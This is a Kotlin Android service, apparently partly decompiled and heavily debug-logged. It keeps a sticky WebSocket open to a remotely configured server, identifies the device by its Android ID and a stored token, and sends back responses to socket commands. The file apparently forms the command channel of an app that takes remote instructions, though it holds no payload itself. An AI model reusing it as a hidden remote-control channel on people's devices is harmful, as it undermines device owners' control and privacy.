package com.hawkshaw.library.datalayer.network.socket

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.provider.Settings
import com.hawkshaw.library.App
import com.hawkshaw.library.config.RemoteConfig
import com.hawkshaw.library.config.getConfig
import com.hawkshaw.library.datalayer.models.SocketCommandResponse
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.preferences.Prefs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.HttpUrl.Companion.toHttpUrlOrNull
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.HttpUrl
import java.util.concurrent.TimeUnit
import android.util.Log

/**
 * Service responsible for maintaining WebSocket connection and handling socket commands
 */
class SocketService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + Job())

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private var socket: WebSocket? = null
    private val listener: SocketListener = SocketListener(this)

    /**
     * Connect to the WebSocket with a delay
     */
    internal fun connect(webSocket: WebSocket? = null, delayMillis: Long = 1000) {
        Log.d(TAG, "[DEBUG] connect called. delayMillis: $delayMillis, current webSocket: $webSocket")
        scope.launch {
            try {
                Log.d(TAG, "[DEBUG] connect: Delaying for $delayMillis ms.")
                delay(delayMillis)

                // Try to get WebSocket URI from RemoteConfig first, then fall back to default config
                // Pass applicationContext to RemoteConfig.getInstance()
                var websocketUri = RemoteConfig.getInstance(applicationContext).getWebsocketUri()
                Log.d(TAG, "[DEBUG] connect: websocketUri from RemoteConfig: '$websocketUri'")
                if (websocketUri.isEmpty()) {
                    Log.d(TAG, "[DEBUG] connect: websocketUri from RemoteConfig is empty, trying default config.")
                    // Corrected assignment using Elvis operator to ensure non-null String
                    websocketUri = App.getContext().getConfig().default_remote_config?.web_socket_uri ?: ""
                    Log.d(TAG, "[DEBUG] connect: websocketUri from default_remote_config: '$websocketUri'")
                    // Corrected check: websocketUri is now guaranteed non-null, so just check if empty
                    if (websocketUri.isEmpty()) {
                         throw IllegalArgumentException("WebSocket URI not found in config")
                    }
                }

                Logger.d(TAG, "Connecting to WebSocket: $websocketUri", false, 4, null) // Existing Logger
                Log.d(TAG, "[DEBUG] connect: Connecting to WebSocket: $websocketUri")

                // Parse the URI to HttpUrl
                Log.d(TAG, "[DEBUG] connect: Parsing URI to HttpUrl.")
                val httpUrl: HttpUrl = websocketUri.toHttpUrlOrNull()
                    ?: throw IllegalArgumentException("Invalid WebSocket URI")
                Log.d(TAG, "[DEBUG] connect: Parsed httpUrl: $httpUrl")

                // Create request with headers
                val androidId = getAndroidId()
                Log.d(TAG, "[DEBUG] connect: Building request with Authorization and App-Id: $androidId")
                val request = Request.Builder()
                    .url(httpUrl)
                    .addHeader("Authorization", "Bearer ${Prefs.getToken()}")
                    .addHeader("App-Id", androidId)
                    .build()
                Log.d(TAG, "[DEBUG] connect: Request built: $request")

                // Close existing socket if any
                if (webSocket != null) {
                    Log.d(TAG, "[DEBUG] connect: Cancelling provided webSocket.")
                    webSocket.cancel()
                }
                if (socket != null) {
                    Log.d(TAG, "[DEBUG] connect: Cancelling existing this.socket.")
                    socket?.cancel()
                }
                
                // Create new socket connection
                Log.d(TAG, "[DEBUG] connect: Creating new WebSocket connection.")
                socket = client.newWebSocket(request, listener)
                Log.d(TAG, "[DEBUG] connect: New WebSocket initiated. Current socket: $socket")

            } catch (e: Exception) {
                Logger.e(TAG, "Connect: ${e.message}", e, false, 12, null) // Existing Logger
                Log.e(TAG, "[DEBUG] connect: Exception: ${e.message}", e)
            }
        }
    }

    /**
     * Get the Android device ID
     */
    private fun getAndroidId(): String {
        val androidId = Settings.Secure.getString(
            App.getContext().contentResolver,
            Settings.Secure.ANDROID_ID
        )
        Log.d(TAG, "[DEBUG] getAndroidId: Retrieved Android ID: $androidId")
        return androidId
    }

    /**
     * Send a text message over the WebSocket
     */
    private fun sendTextMessage(message: String) {
        Log.d(TAG, "[DEBUG] sendTextMessage called. Message: $message")
        val currentSocket = socket
        if (currentSocket == null || !isSocketConnected()) {
            Log.d(TAG, "[DEBUG] sendTextMessage: Socket not connected. Attempting to reconnect with delay 5000ms.")
            connect(delayMillis = 5000)
            return
        }

        try {
            Log.d(TAG, "[DEBUG] sendTextMessage: Sending message via currentSocket.")
            currentSocket.send(message)
            Log.d(TAG, "[DEBUG] sendTextMessage: Message sent successfully.")
        } catch (e: Exception) {
            Logger.e(TAG, "SendTextMessage: ${e.message}", e, false, 12, null) // Existing Logger
            Log.e(TAG, "[DEBUG] sendTextMessage: Exception: ${e.message}", e)
        }
    }

    /**
     * Check if the socket is connected
     */
    private fun isSocketConnected(): Boolean {
        val connected = socket?.let { true } ?: false
        Log.d(TAG, "[DEBUG] isSocketConnected: $connected")
        return connected
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "[DEBUG] onBind called. Intent: $intent, returning null.")
        return null
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "[DEBUG] onCreate called. Connecting socket.")
        connect()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "[DEBUG] onStartCommand called. Intent: $intent, flags: $flags, startId: $startId")
        intent?.getStringExtra(RESPONSE_KEY)?.let { response ->
            Log.d(TAG, "[DEBUG] onStartCommand: Received response from intent: $response. Sending text message.")
            sendTextMessage(response)
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "[DEBUG] onDestroy called. Cancelling socket.")
        socket?.cancel()
        socket = null
        Log.d(TAG, "[DEBUG] onDestroy: Socket cancelled and set to null.")
    }

    companion object {
        private const val TAG = "SocketService" // Existing TAG
        private const val RESPONSE_KEY = "response"

        /**
         * Connect to the WebSocket server
         */
        suspend fun connectSocket() {
            Log.d(TAG, "[DEBUG] Companion.connectSocket called.")
            val context = App.getContext()
            val intent = Intent(context, SocketService::class.java)

            Log.d(TAG, "[DEBUG] Companion.connectSocket: Stopping existing service.")
            context.stopService(intent)

            Log.d(TAG, "[DEBUG] Companion.connectSocket: Waiting a bit (1000ms) before starting a new one.")
            delay(1000)

            Log.d(TAG, "[DEBUG] Companion.connectSocket: Starting the service.")
            context.startService(intent)
            Log.d(TAG, "[DEBUG] Companion.connectSocket: Service start requested.")
        }

        /**
         * Disconnect from the WebSocket server
         */
        fun disconnectSocket() {
            Log.d(TAG, "[DEBUG] Companion.disconnectSocket called.")
            val context = App.getContext()
            val intent = Intent(context, SocketService::class.java)
            Log.d(TAG, "[DEBUG] Companion.disconnectSocket: Stopping the service.")
            context.stopService(intent)
            Log.d(TAG, "[DEBUG] Companion.disconnectSocket: Service stop requested.")
        }

        /**
         * Send a response through the WebSocket
         */
        fun sendResponse(response: SocketCommandResponse) {
            Log.d(TAG, "[DEBUG] Companion.sendResponse called. Response object: $response")
            val context = App.getContext()
            val intent = Intent(context, SocketService::class.java)

            // Serialize the response to JSON
            val json = ContentNegotiationInterceptorKt.json
            val responseJson = json.encodeToString(
                SocketCommandResponse.serializer(),
                response
            )

            Logger.v(TAG, "Response: $responseJson", false, 4, null) // Existing Logger
            Log.d(TAG, "[DEBUG] Companion.sendResponse: Serialized responseJson: $responseJson")
            intent.putExtra(RESPONSE_KEY, responseJson)
            Log.d(TAG, "[DEBUG] Companion.sendResponse: Starting service with intent carrying responseJson.")
            context.startService(intent)
            Log.d(TAG, "[DEBUG] Companion.sendResponse: Service start requested for sending response.")
        }
    }
}
